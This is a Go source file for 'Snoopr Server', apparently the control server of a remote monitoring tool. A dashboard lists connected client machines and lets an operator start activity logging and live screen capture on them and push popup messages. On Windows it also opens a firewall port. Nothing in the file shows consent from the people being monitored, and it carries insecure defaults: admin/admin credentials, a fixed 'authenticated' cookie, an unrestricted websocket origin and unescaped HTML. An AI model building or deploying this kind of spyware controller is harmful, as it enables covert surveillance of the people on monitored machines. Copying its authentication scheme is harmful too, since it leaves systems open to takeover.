package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type Server struct {
	clients    map[string]*Client
	clientsMux sync.RWMutex
	upgrader   websocket.Upgrader
	username   string
	password   string
}

type Client struct {
	ID       string    `json:"id"`
	IP       string    `json:"ip"`
	Hostname string    `json:"hostname"`
	OS       string    `json:"os"`
	LastSeen time.Time `json:"lastSeen"`
	Conn     *websocket.Conn
}

type Message struct {
	Type string      `json:"type"`
	From string      `json:"from"`
	To   string      `json:"to"`
	Data interface{} `json:"data"`
	Time time.Time   `json:"time"`
}

type ActivityLog struct {
	ClientID  string    `json:"clientId"`
	Type      string    `json:"type"`
	Data      string    `json:"data"`
	Timestamp time.Time `json:"timestamp"`
}

var server *Server
var activityLogs []ActivityLog
var logsMux sync.RWMutex
var dashboardClients = make(map[*websocket.Conn]bool)
var dashboardMux sync.RWMutex

func main() {
	server = &Server{
		clients:  make(map[string]*Client),
		username: "admin",
		password: "admin",
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
		},
	}

	// Windows-specific setup
	if runtime.GOOS == "windows" {
		elevatePrivileges()
		openFirewallPort()
	}

	// Check if port is available
	if !isPortAvailable(8080) {
		fmt.Printf("Error: Port 8080 is already in use!\n")
		fmt.Printf("Please:\n")
		fmt.Printf("1. Close any other applications using port 8080\n")
		fmt.Printf("2. Or modify the port in the source code\n")
		fmt.Printf("3. Check with: netstat -ano | findstr :8080\n")
		os.Exit(1)
	}

	r := mux.NewRouter()

	// Authentication middleware
	authMiddleware := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/login" || r.URL.Path == "/auth" {
				next(w, r)
				return
			}

			cookie, err := r.Cookie("auth")
			if err != nil || cookie.Value != "authenticated" {
				http.Redirect(w, r, "/login", http.StatusFound)
				return
			}
			next(w, r)
		}
	}

	// Static files and routes
	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))
	r.HandleFunc("/login", loginHandler)
	r.HandleFunc("/auth", authHandler)
	r.HandleFunc("/", authMiddleware(dashboardHandler))
	r.HandleFunc("/api/clients", authMiddleware(clientsHandler))
	r.HandleFunc("/api/logs", authMiddleware(logsHandler))
	r.HandleFunc("/api/message", authMiddleware(messageHandler))
	r.HandleFunc("/api/command", authMiddleware(commandHandler))
	r.HandleFunc("/api/settings", authMiddleware(settingsHandler))
	r.HandleFunc("/ws/client", clientWebSocketHandler)
	r.HandleFunc("/ws/dashboard", authMiddleware(dashboardWebSocketHandler))

	fmt.Println("Snoopr Server starting on :8080")
	fmt.Println("Dashboard: http://localhost:8080")
	fmt.Printf("Credentials: %s / %s\n", server.username, server.password)

	if runtime.GOOS == "windows" {
		fmt.Println("\nWindows Notes:")
		fmt.Println("- If Windows Firewall blocks connections, manually allow port 8080")
		fmt.Println("- For network access, ensure port 8080 is accessible from other machines")
	}

	fmt.Println("\nServer ready! Press Ctrl+C to stop.")

	err := http.ListenAndServe("0.0.0.0:8080", r)
	if err != nil {
		fmt.Printf("Server failed to start: %v\n", err)
		if runtime.GOOS == "windows" {
			fmt.Println("\nWindows troubleshooting:")
			fmt.Println("1. Run as Administrator for full functionality")
			fmt.Println("2. Check if port 8080 is in use: netstat -ano | findstr :8080")
			fmt.Println("3. Try disabling Windows Firewall temporarily")
		}
		os.Exit(1)
	}
}

func elevatePrivileges() {
	// Check if already running as admin
	if !isAdmin() {
		fmt.Println("Note: For full functionality on Windows, run as Administrator")
		fmt.Println("Some features like firewall configuration may not work")
		return
	}
}

func isAdmin() bool {
	if runtime.GOOS != "windows" {
		return true
	}

	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

func isPortAvailable(port int) bool {
	address := fmt.Sprintf(":%d", port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		return false
	}
	listener.Close()
	return true
}

func openFirewallPort() {
	if runtime.GOOS != "windows" {
		return
	}

	// Only try to open firewall if running as admin
	if !isAdmin() {
		fmt.Println("Skipping firewall configuration (not running as admin)")
		return
	}

	fmt.Println("Configuring Windows firewall...")

	// Remove existing rule first (ignore errors)
	cmd := exec.Command("netsh", "advfirewall", "firewall", "delete", "rule", "name=Snoopr Server")
	cmd.Run()

	// Add new rule
	cmd = exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		"name=Snoopr Server", "dir=in", "action=allow", "protocol=TCP", "localport=8080")
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Warning: Could not configure firewall rule: %v\n", err)
		fmt.Println("You may need to manually allow port 8080 in Windows Firewall")
	} else {
		fmt.Println("Firewall rule added successfully")
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <title>Snoopr - Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 0; padding: 0; }
        .login-container { display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-form { background: #2d2d2d; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        .login-form h2 { text-align: center; color: #ff6b6b; margin-bottom: 1.5rem; }
        .form-group { margin-bottom: 1rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; }
        .form-group input { width: 100%; padding: 0.75rem; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
        .btn { background: #ff6b6b; color: white; padding: 0.75rem 1.5rem; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
        .btn:hover { background: #ff5252; }
        .error { color: #ff6b6b; text-align: center; margin-top: 1rem; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <h2>🕵️ Snoopr Dashboard</h2>
            <form method="POST" action="/auth">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn">Login</button>
            </form>
        </div>
    </div>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func authHandler(w http.ResponseWriter, r *http.Request) {
	username := r.FormValue("username")
	password := r.FormValue("password")

	if username == server.username && password == server.password {
		http.SetCookie(w, &http.Cookie{
			Name:  "auth",
			Value: "authenticated",
			Path:  "/",
		})
		http.Redirect(w, r, "/", http.StatusFound)
	} else {
		http.Redirect(w, r, "/login", http.StatusFound)
	}
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <title>Snoopr Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 0; padding: 0; }
        .header { background: #2d2d2d; padding: 1rem; border-bottom: 2px solid #ff6b6b; }
        .header h1 { margin: 0; color: #ff6b6b; display: inline-block; }
        .logout { float: right; background: #666; color: white; padding: 0.5rem 1rem; text-decoration: none; border-radius: 4px; }
        .container { display: flex; height: calc(100vh - 80px); }
        .sidebar { width: 300px; background: #2d2d2d; padding: 1rem; overflow-y: auto; }
        .main-content { flex: 1; padding: 1rem; overflow-y: auto; }
        .client-list { margin-bottom: 2rem; }
        .client-item { background: #333; margin: 0.5rem 0; padding: 1rem; border-radius: 4px; cursor: pointer; }
        .client-item:hover { background: #444; }
        .client-item.active { border-left: 4px solid #ff6b6b; }
        .controls { background: #2d2d2d; padding: 1rem; margin-bottom: 1rem; border-radius: 4px; }
        .btn { background: #ff6b6b; color: white; padding: 0.5rem 1rem; border: none; border-radius: 4px; cursor: pointer; margin: 0.25rem; }
        .btn:hover { background: #ff5252; }
        .btn.danger { background: #f44336; }
        .btn.success { background: #4caf50; }
        .logs { background: #2d2d2d; padding: 1rem; border-radius: 4px; height: 400px; overflow-y: auto; }
        .log-entry { padding: 0.5rem; border-bottom: 1px solid #444; font-size: 0.9rem; }
        .message-input { width: 70%; padding: 0.5rem; background: #333; border: 1px solid #666; color: #fff; border-radius: 4px; }
        .status { padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.8rem; }
        .status.online { background: #4caf50; }
        .status.offline { background: #f44336; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕵️ Snoopr Dashboard</h1>
        <a href="/login" class="logout">Logout</a>
    </div>
    <div class="container">
        <div class="sidebar">
            <h3>Connected Clients</h3>
            <div id="clients" class="client-list">
                <!-- Clients will be populated here -->
            </div>
            <div class="controls">
                <h4>Controls</h4>
                <button class="btn" onclick="sendMessage()">Send Message</button>
                <button class="btn success" onclick="startLogging()">Start Logging</button>
                <button class="btn danger" onclick="stopLogging()">Stop Logging</button>
                <br><br>
                <button class="btn success" onclick="startScreenShare()">Start Screen Share</button>
                <button class="btn danger" onclick="stopScreenShare()">Stop Screen Share</button>
                <br><br>
                <input type="text" id="messageInput" class="message-input" placeholder="Type message to send to client...">
                <br><br>
                <button class="btn" onclick="refreshClients()">Refresh Clients</button>
            </div>
        </div>
        <div class="main-content">
            <h3>Live Screen View</h3>
            <div id="screenView" style="background: #2d2d2d; padding: 1rem; border-radius: 4px; margin-bottom: 1rem; height: 300px; overflow: auto;">
                <div id="noScreenMessage" style="text-align: center; color: #666; padding: 50px;">
                    Select a client and start screen sharing to view live feed
                </div>
                <img id="liveScreen" style="max-width: 100%; display: none;" alt="Live Screen">
            </div>
            
            <h3>Activity Logs</h3>
            <div id="logs" class="logs">
                <!-- Logs will be populated here -->
            </div>
        </div>
    </div>

    <script>
        let selectedClient = null;
        let ws = null;

        function connectWebSocket() {
            ws = new WebSocket('ws://localhost:8080/ws/dashboard');
            ws.onmessage = function(event) {
                const message = JSON.parse(event.data);
                handleWebSocketMessage(message);
            };
            ws.onclose = function() {
                setTimeout(connectWebSocket, 3000);
            };
        }

        function handleWebSocketMessage(message) {
            if (message.type === 'client_update') {
                refreshClients();
            } else if (message.type === 'activity_log') {
                addLogEntry(message.data);
            } else if (message.type === 'screen_capture') {
                updateScreenView(message.data);
            }
        }

        function refreshClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(clients => {
                    const clientsDiv = document.getElementById('clients');
                    clientsDiv.innerHTML = '';
                    clients.forEach(client => {
                        const div = document.createElement('div');
                        div.className = 'client-item';
                        div.onclick = () => selectClient(client.id);
                        div.innerHTML = '<strong>' + client.hostname + '</strong><br>' +
                                       '<small>' + client.ip + '</small><br>' +
                                       '<span class="status online">Online</span>';
                        clientsDiv.appendChild(div);
                    });
                });
        }

        function selectClient(clientId) {
            selectedClient = clientId;
            document.querySelectorAll('.client-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.classList.add('active');
        }

        function sendMessage() {
            const message = document.getElementById('messageInput').value;
            if (!message || !selectedClient) {
                alert('Please select a client and enter a message');
                return;
            }
            
            fetch('/api/message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({clientId: selectedClient, message: message})
            });
            
            document.getElementById('messageInput').value = '';
        }

        function startLogging() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            sendCommand('start_logging');
        }

        function stopLogging() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            sendCommand('stop_logging');
        }

        function startScreenShare() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            sendCommand('start_screen_share');
            document.getElementById('noScreenMessage').style.display = 'none';
        }

        function stopScreenShare() {
            if (!selectedClient) {
                alert('Please select a client');
                return;
            }
            sendCommand('stop_screen_share');
            document.getElementById('liveScreen').style.display = 'none';
            document.getElementById('noScreenMessage').style.display = 'block';
        }

        function sendCommand(command) {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({clientId: selectedClient, command: command})
            });
        }

        function updateScreenView(data) {
            if (data.clientId === selectedClient && data.image) {
                const img = document.getElementById('liveScreen');
                img.src = 'data:image/jpeg;base64,' + data.image;
                img.style.display = 'block';
                document.getElementById('noScreenMessage').style.display = 'none';
            }
        }

        function loadLogs() {
            fetch('/api/logs')
                .then(response => response.json())
                .then(logs => {
                    const logsDiv = document.getElementById('logs');
                    logsDiv.innerHTML = '';
                    logs.forEach(log => {
                        addLogEntry(log);
                    });
                });
        }

        function addLogEntry(log) {
            const logsDiv = document.getElementById('logs');
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = '<strong>[' + new Date(log.timestamp).toLocaleString() + ']</strong> ' +
                           '<em>' + log.clientId + '</em>: ' + log.type + ' - ' + log.data;
            logsDiv.appendChild(div);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        // Initialize
        connectWebSocket();
        refreshClients();
        loadLogs();
        setInterval(refreshClients, 5000);
        setInterval(loadLogs, 2000);
    </script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(tmpl))
}

func clientsHandler(w http.ResponseWriter, r *http.Request) {
	server.clientsMux.RLock()
	clients := make([]*Client, 0, len(server.clients))
	for _, client := range server.clients {
		clients = append(clients, client)
	}
	server.clientsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(clients)
}

func logsHandler(w http.ResponseWriter, r *http.Request) {
	logsMux.RLock()
	defer logsMux.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(activityLogs)
}

func messageHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"clientId"`
		Message  string `json:"message"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	server.clientsMux.RLock()
	client, exists := server.clients[req.ClientID]
	server.clientsMux.RUnlock()

	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	msg := Message{
		Type: "popup_message",
		Data: req.Message,
		Time: time.Now(),
	}

	client.Conn.WriteJSON(msg)

	// Log the message
	logsMux.Lock()
	activityLogs = append(activityLogs, ActivityLog{
		ClientID:  req.ClientID,
		Type:      "message_sent",
		Data:      req.Message,
		Timestamp: time.Now(),
	})
	logsMux.Unlock()

	w.WriteHeader(http.StatusOK)
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string `json:"clientId"`
		Command  string `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	server.clientsMux.RLock()
	client, exists := server.clients[req.ClientID]
	server.clientsMux.RUnlock()

	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	msg := Message{
		Type: req.Command,
		Data: nil,
		Time: time.Now(),
	}

	client.Conn.WriteJSON(msg)

	// Log the command
	logsMux.Lock()
	activityLogs = append(activityLogs, ActivityLog{
		ClientID:  req.ClientID,
		Type:      "command_sent",
		Data:      req.Command,
		Timestamp: time.Now(),
	})
	logsMux.Unlock()

	w.WriteHeader(http.StatusOK)
}

func settingsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var settings struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}

		if err := json.NewDecoder(r.Body).Decode(&settings); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		server.username = settings.Username
		server.password = settings.Password

		w.WriteHeader(http.StatusOK)
	}
}

func clientWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// Client registration
	var regMsg Message
	if err := conn.ReadJSON(&regMsg); err != nil {
		log.Printf("Client registration error: %v", err)
		return
	}

	clientData := regMsg.Data.(map[string]interface{})

	// Use provided client ID or generate one
	var clientID string
	if id, exists := clientData["clientId"]; exists {
		clientID = id.(string)
	} else {
		clientID = fmt.Sprintf("client_%d", time.Now().Unix())
	}

	server.clientsMux.Lock()
	// Check if client already exists - update it instead of creating new
	existingClient, exists := server.clients[clientID]
	if exists {
		// Update existing client
		existingClient.IP = r.RemoteAddr
		existingClient.LastSeen = time.Now()
		existingClient.Conn = conn
		log.Printf("Client reconnected: %s (%s)", existingClient.Hostname, existingClient.IP)
	} else {
		// Create new client
		client := &Client{
			ID:       clientID,
			IP:       r.RemoteAddr,
			Hostname: clientData["hostname"].(string),
			OS:       clientData["os"].(string),
			LastSeen: time.Now(),
			Conn:     conn,
		}
		server.clients[clientID] = client
		log.Printf("New client connected: %s (%s)", client.Hostname, client.IP)
	}
	server.clientsMux.Unlock()

	// Get the current client for message handling
	server.clientsMux.RLock()
	currentClient := server.clients[clientID]
	server.clientsMux.RUnlock()

	// Handle client messages
	for {
		var msg Message
		if err := conn.ReadJSON(&msg); err != nil {
			log.Printf("Client message error: %v", err)
			break
		}

		// Update last seen time
		server.clientsMux.Lock()
		if client, exists := server.clients[clientID]; exists {
			client.LastSeen = time.Now()
		}
		server.clientsMux.Unlock()

		// Handle screen capture separately
		if msg.Type == "screen_capture" {
			// Broadcast screen capture to dashboard clients
			broadcastToDashboard(msg)
			continue
		}

		// Log activity
		logsMux.Lock()
		activityLogs = append(activityLogs, ActivityLog{
			ClientID:  clientID,
			Type:      msg.Type,
			Data:      fmt.Sprintf("%v", msg.Data),
			Timestamp: time.Now(),
		})
		logsMux.Unlock()
	}

	// Cleanup
	server.clientsMux.Lock()
	delete(server.clients, clientID)
	server.clientsMux.Unlock()

	log.Printf("Client disconnected: %s", currentClient.Hostname)
}

func broadcastToDashboard(msg Message) {
	dashboardMux.RLock()
	defer dashboardMux.RUnlock()

	for conn := range dashboardClients {
		err := conn.WriteJSON(msg)
		if err != nil {
			// Remove disconnected client
			delete(dashboardClients, conn)
		}
	}
}

func dashboardWebSocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := server.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Dashboard WebSocket upgrade error: %v", err)
		return
	}
	defer func() {
		dashboardMux.Lock()
		delete(dashboardClients, conn)
		dashboardMux.Unlock()
		conn.Close()
	}()

	// Add to dashboard clients
	dashboardMux.Lock()
	dashboardClients[conn] = true
	dashboardMux.Unlock()

	// Keep connection alive and send updates
	for {
		time.Sleep(5 * time.Second)

		msg := Message{
			Type: "ping",
			Time: time.Now(),
		}

		if err := conn.WriteJSON(msg); err != nil {
			break
		}
	}
}
